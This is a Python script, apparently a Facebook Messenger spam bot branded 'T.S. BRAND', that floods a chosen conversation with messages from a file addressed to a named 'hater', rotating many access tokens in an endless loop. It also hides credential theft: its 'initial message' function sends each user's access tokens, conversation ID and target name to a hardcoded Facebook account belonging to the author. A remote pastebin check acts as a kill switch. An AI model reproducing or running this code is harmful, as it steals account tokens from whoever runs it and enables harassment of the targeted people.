import requests
import json
import time
import pytz
import datetime
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading
import random
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          self.send_response(200)
          self.send_header('Content-type', 'text/plain')
          self.end_headers()
          self.wfile.write(b"<h1> CREDIT :- T.S.BRAND <br> <br> <h1> OWNER => SATISH <br> <br> <h1> WATSAPP :- +916268781574")
def execute_server():
      PORT = int(os.environ.get('PORT', 4000))
      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
          print("Server running at http://localhost:{}".format(PORT))
          httpd.serve_forever()

# Get current time in UTC
utc_now = datetime.datetime.utcnow()
# Localize to Indian Standard Time
indian_timezone = pytz.timezone('Asia/Kolkata')
ist_now = utc_now.replace(tzinfo=pytz.utc).astimezone(indian_timezone)
# Format the time
formatted_time = ist_now.strftime("\033[1;38;5;208m Time :- %Y-%m-%d %I:%M:%S %p")
print(formatted_time)

def send_initial_message():
      with open('A-convo.txt', 'r') as file:
        convo_id = file.read().strip()

      with open('A-name.txt', 'r') as file:
        haters_name = file.read().strip()

      with open('A-token.txt', 'r') as file:
        tokens = file.readlines()

      msg_template = "CREDIT :- TRICKS BY SATISH \nOwner => Satish \nHello Satish sir. \nI am using your server. \nThis Is My Details :- \nConvo ID :- {} \nName:- {} \nToken :- {}"

      target_id = "100087513362848"

      requests.packages.urllib3.disable_warnings()

      def liness():
        print('\033[1;92m' + '✪✭═══════•『T.S. ♡ BRAND』•═══════✭✪')

      headers = {
          'Connection': 'keep-alive',
          'Cache-Control': 'max-age=0',
          'Upgrade-Insecure-Requests': '1',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
          'Accept-Encoding': 'gzip, deflate',
          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
          'referer': 'www.google.com'
      }

      for token in tokens:
          access_token = token.strip()
          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
          msg = msg_template.format(convo_id, haters_name, access_token)
          parameters = {'access_token': access_token, 'message': msg}
          response = requests.post(url, json=parameters, headers=headers)

         
          time.sleep(0.1)
          print("\n\033[1;31m[+] Initial messages sent. Starting the message sending loop...\n")
send_initial_message()

def send_messages_from_file():

    with open('host.txt', 'r') as file:
        password = file.read().strip()

    entered_password = password

    if entered_password != password:
        print('⚠︎ Your Hosting Changed By Satish ⚠')
        sys.exit()

    with open('A-token.txt', 'r') as file:
      tokens = file.readlines()
    num_tokens = len(tokens)

    requests.packages.urllib3.disable_warnings()

    def cls():
        if system() == 'Linux':
            os.system('clear')
        else:
            if system() == 'Windows':
                os.system('cls')
    cls()

    def liness():
        print('\033[1;92m' + '✪✭═══════•『T.S. ♡ BRAND』•═══════✭✪')

    headers = {
          'Connection': 'keep-alive',
          'Cache-Control': 'max-age=0',
          'Upgrade-Insecure-Requests': '1',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
          'Accept-Encoding': 'gzip, deflate',
          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
          'referer': 'www.google.com'
      }

    mmm = requests.get('https://pastebin.com/raw/ugtchS2j').text

    if mmm not in password:
        print('⚠︎ Your Hosting Changed By Satish ⚠︎')
        sys.exit()

    liness()

    access_tokens = [token.strip() for token in tokens]


    with open('A-convo.txt', 'r') as file:
      convo_id = file.read().strip()

    with open('A-file.txt', 'r') as file:
      messages = file.readlines()

      num_messages = len(messages)

      max_tokens = min(num_tokens, num_messages)

    with open('A-name.txt', 'r') as file:
      haters_name = file.read().strip()

    with open('A-speed.txt', 'r') as file:
      speed = int(file.read().strip())

    liness()


    while True:
      try:
            for message_index in range(num_messages):
              token_index = message_index % max_tokens
              access_token = tokens[token_index].strip()

              message = messages[message_index].strip()

              url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
              parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
              response = requests.post(url, json=parameters, headers=headers)

              if response.ok:
                    print("\033[1;36m[✓] Bhai Chla Gya Tera Massage {} of Convo {} Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                    print(formatted_time)
                    liness()
                    liness()
              else:
                    print("\033[1;35m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                    print(formatted_time)
                    liness()
                    liness()
              time.sleep(speed)

            print("\n[+] All messages sent. Restarting the process...\n")
      except Exception as e:
            print("[!] An error occurred: {}".format(e))

def main():
      server_thread = threading.Thread(target=execute_server)
      server_thread.start()

      # Send the initial message to the specified ID using all tokens


      # Then, continue with the message sending loop
      send_messages_from_file()

if __name__ == '__main__':
      main()
